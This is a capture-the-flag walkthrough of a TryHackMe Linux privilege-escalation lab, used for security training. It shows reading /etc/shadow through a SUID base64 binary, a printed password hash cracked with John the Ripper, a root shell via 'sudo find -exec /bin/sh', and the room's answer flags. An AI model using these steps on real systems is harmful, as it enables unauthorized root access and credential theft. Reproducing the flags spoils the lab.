# Linux PrivEsc Capstone

URL: https://tryhackme.com/room/linprivesc

Description: TryHackMe Linux PrivEsc challenge which features Horizontal and Vertical Priviledge 

Tags: GTFObins, John the Ripper, SSH, SUID, Sudo, etc-shadow, find

# Description

By now you have a fairly good understanding of the main privilege escalation vectors on Linux and this challenge should be fairly easy.

You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root. We designed this room to help you build a thorough methodology for Linux 
privilege escalation that will be very useful in exams such as OSCP and your penetration testing engagements.

Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.

You can access the target machine over your browser or use the SSH credentials below.

- Username: leonard
- Password: Penny123

# Attack Chain

```bash
# Setup
export ip=10.10.76.192

# Horizontal PrivEsc
sudo ssh leonard@$ip #Penny123 

find / -type f -perm -04000 -ls 2>/dev/null
base64 /etc/shadow | base64 --decode

printf 'missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::' >> missy_shadow.txt
printf 'missy:x:1001:1001::/home/missy:/bin/bash' >> missy_passwd.txt
unshadow missy_passwd.txt missy_shadow.txt >> missy_unshadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt missy_unshadow.txt

exit
# Vertical PrivEsc (under missy account)
sudo ssh missy@$ip # Password1

sudo -l 
sudo find . -exec /bin/sh \; -quit

whoami #root

# Flags
find . -name flag*.txt
cat /home/missy/Documents/flag1.txt
cat /home/rootflag/flag2.txt # requires root

```

---

# Detailed solution

## Initial approach

- Tried sudo -l but no output
- Tried getcap -r / but nothing exploitable
- Tried Accessing /etc/shadow but was unable to access.
- Then I found an entry using SUID

# Finding SUID capable files

`find / -type f -perm -04000 -ls 2>/dev/null`

![Untitled](Linux%20PrivEsc%20Capstone/Untitled.png)

## Base64

[https://gtfobins.github.io/gtfobins/base64/#suid](https://gtfobins.github.io/gtfobins/base64/#suid)

base64 will allow reading of files and was able to read /etc/shadow `base64 /etc/shadow | base64 --decode`

![Untitled](Linux%20PrivEsc%20Capstone/Untitled%201.png)

# Brute-force Credential

Unshadowed the files for `missy` and perform password bruteforce using the John the Ripper

```bash
printf 'missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::' >> missy_shadow.txt
printf 'missy:x:1001:1001::/home/missy:/bin/bash' >> missy_passwd.txt

unshadow missy_passwd.txt missy_shadow.txt >> missy_unshadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt missy_unshadow.txt
```

![Untitled](Linux%20PrivEsc%20Capstone/Untitled%202.png)

Cracked account - `missy:Password1`

Afterwards I tried browsing for flags then try to gain root access using the account of `missy`

# Flag 1

Just browsing the directories under missy and was able to find the flag1.txt in the `Documents`

![Untitled](Linux%20PrivEsc%20Capstone/Untitled%203.png)

Flag 1 **:** `THM-42828719920544`

# Root Access

I was able to find a sudo permission using `sudo -l` and was able to gain root access using `find` command [https://gtfobins.github.io/gtfobins/find/#sudo](https://gtfobins.github.io/gtfobins/find/#sudo)

command: ``sudo find . -exec /bin/sh \; -quit``

![Untitled](Linux%20PrivEsc%20Capstone/Untitled%204.png)

![Untitled](Linux%20PrivEsc%20Capstone/Untitled%205.png)

I am now root :)

# Flag 2

After getting root, I tried to look for the flag under root folder. Then looked under the whole drive. The flag2 is located at `/home/rootflag/flag2.txt`

![Untitled](Linux%20PrivEsc%20Capstone/Untitled%206.png)

Flag 2: `THM-168824782390238`